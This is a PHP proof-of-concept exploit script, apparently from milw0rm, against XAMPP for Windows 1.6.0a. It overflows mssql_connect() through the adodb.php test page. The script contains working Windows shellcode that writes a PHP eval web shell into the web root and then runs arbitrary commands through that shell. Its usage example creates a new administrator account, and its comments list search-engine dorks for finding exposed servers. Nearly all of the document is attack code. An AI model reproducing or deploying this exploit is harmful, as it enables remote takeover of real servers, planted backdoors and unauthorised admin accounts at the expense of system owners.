<?php
print_r('
---------------------------------------------------------------------------
XAMPP for Windows <= 1.6.0a adodb.php/mssql_connect() remote buffer overflow
proof-of-concept exploit
seh overwrite method / 2000 sp3 version
mail: retrog at alice dot it
site: http://retrogod.altervista.org
---------------------------------------------------------------------------
');

/*

http://sourceforge.net/project/showfiles.php?group_id=61776

this easy to install Apache / MySQL / PHP distribution for Windows
carries various (lots) test scripts vulnerable to sql injection, but
we have here another kind of injection, adodb.php lines 62-68:

...
                      	include_once 'adodb/adodb-errorpear.inc.php';
			include_once 'adodb/adodb.inc.php';
			include_once 'adodb/tohtml.inc.php';

                        $db = ADONewConnection($_POST['dbserver']);

                        @$db->Connect($_POST['host'], $_POST['user'], $_POST['password'], $_POST['database']);
			echo "<p><b>DBServer: $_POST[dbserver]</b><p>";
			$result = $db->Execute("SELECT * FROM $_POST[table]");
...

mssql_connect() function is vulnerable to buffer overflow and
the host argument is totally unchecked. Also this shows a vulnerabilty in
ADODB library (which is in the include path, inside PEAR folder) in the
Connect method .

If you say that this should be not used for production purpose or
exposed to the outside world, try theese google dorks:

intitle:XAMPP intitle:windows intitle:version
intitle:XAMPP intitle:version intitle:1.6.0a +windows

note: I could use the INTO OUTFILE method through sql injection
to export some shell inside the /htdocs folder because we have FILE
privilege, but we have  magic_quotes_gpc on here. This is instead
possbile through the PhpMyAdmin default user/password.
note ii: PHP version is 5.2.1
note iii: bof is possible because mssql extension is enabled
by default in php.ini
*/

if ($argc<2) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host cmd OPTIONS
host:      target server (ip/hostname)
cmd:       a shell command
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
 -S           only send the second packet
Example:
php '.$argv[0].' localhost VER -P1.1.1.1:80
php '.$argv[0].' localhost NET USER sun tzu /ADD ^&^& NET LOCALGROUP
Administrators /ADD sun -p81 -S
---------------------------------------------------------------------------
');
    die;
}
error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet,$want_out)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],(int)$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($want_out){
      if ($proxy=='') {
        $html='';
        while (!feof($ock)) {
          $html.=fgets($ock);
        }
      }
      else {
        $html='';
        while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
          $html.=fread($ock,1);
        }
      }
  }
  fclose($ock);
}

$host=$argv[1];
$port=80;
$proxy="";
$cmd="";
$send_bof=true;
for ($i=2; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p")
and ($temp<>"-P")
and ($temp<>"-S")
){
  $cmd.=" ".$argv[$i];
}
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-S")
{
  $send_bof=false;
}
}
if ($proxy=='') {$p="";} else {$p='http://'.$host.':'.$port;}

//bad chars -> \x00,\x22,\x27,\x5c thoose affected by magic_quotes_gpc
//102 bytes execute command one by me...
//cmd.exe /c echo ^<?php eval($_SERVER[HTTP_C]);?^> > ./htdocs/xampp/s.php &

if ($send_bof){
$____scode=
"\xeb\x13\x5b\x31\xc0\x50\x31\xc0\x88\x43\x4a\x53".
"\xbb\xca\x73\xe9\x77". //WinExec, kernel32.dll
"\xff\xd3\x31\xc0\xe8\xe8\xff\xff\xff\x63\x6d\x64".
"\x2e\x65\x78\x65\x20\x2f\x63\x20\x65\x63\x68\x6f".
"\x20\x5e\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c".
"\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x48\x54".
"\x54\x50\x5f\x43\x5d\x29\x3b\x3f\x5e\x3e\x20\x3e".
"\x20\x2e\x2f\x68\x74\x64\x6f\x63\x73\x2f\x78\x61".
"\x6d\x70\x70\x2f\x73\x2e\x70\x68\x70\x20\x26\x20".
"\xff";

//some junk to make this adjustable for sp4
//eip = ecx
$eip="\x47\x30\xE9\x77"; //0x77E93047  pop ECX - pop - retbis kernel32.dll and further ja short
$jmp="\xeb\x8b\x90\x90"; //jmp short
$____suntzu=str_repeat("\x90",1932-strlen($____scode)).$____scode."\x90\x90\x90\x90\x90\x90\x90\x90".$jmp.$eip;

$data ="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"dbserver\";\r\n\r\n";
$data.="mssql\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"host\";\r\n\r\n";
$data.="$____suntzu\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"adodb\";\r\n\r\n";
$data.="submit\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"user\";\r\n\r\n";
$data.="1\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"password\";\r\n\r\n";
$data.="1\r\n";
$data.="-----------------------------7d61bcd1f033e\r\n";
$data.="Content-Disposition: form-data; name=\"database\";\r\n\r\n";
$data.="1\r\n";
$data.="-----------------------------7d61bcd1f033e--\r\n";
$packet ="POST $p/xampp/adodb.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet,0);
sleep(2);
}

echo "cmd -> ".$cmd."\n";

$packet ="GET $p/xampp/s.php HTTP/1.0\r\n";
$packet.="C: error_reporting(E_ALL);set_time_limit(0);echo \"_delim_\";passthru(\$_SERVER[HTTP_CMD]);echo \"_delim_\";\r\n";
$packet.="CMD: $cmd\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet,1);
$out=explode("_delim_",$html);
echo $out[1];
?>

# milw0rm.com [2007-04-15]
